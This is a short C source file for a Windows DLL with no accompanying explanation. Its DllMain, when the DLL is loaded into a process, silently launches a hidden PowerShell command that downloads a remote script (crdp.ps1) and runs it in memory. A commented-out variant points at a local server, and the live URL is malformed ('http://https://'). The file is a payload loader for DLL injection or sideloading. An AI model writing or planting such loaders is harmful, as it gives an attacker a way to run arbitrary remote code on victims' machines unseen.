#include <windows.h>



BOOL WINAPI DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{


 
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:


        //WinExec("powershell iex(iwr http://127.0.0.1:80/crdp.ps1)", SW_HIDE);
        WinExec("powershell iex(iwr http://https://raw.githubusercontent.com/veath1/CRDP/main/crdp.ps1)", SW_HIDE);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:

        break;
    }
    return TRUE;
}
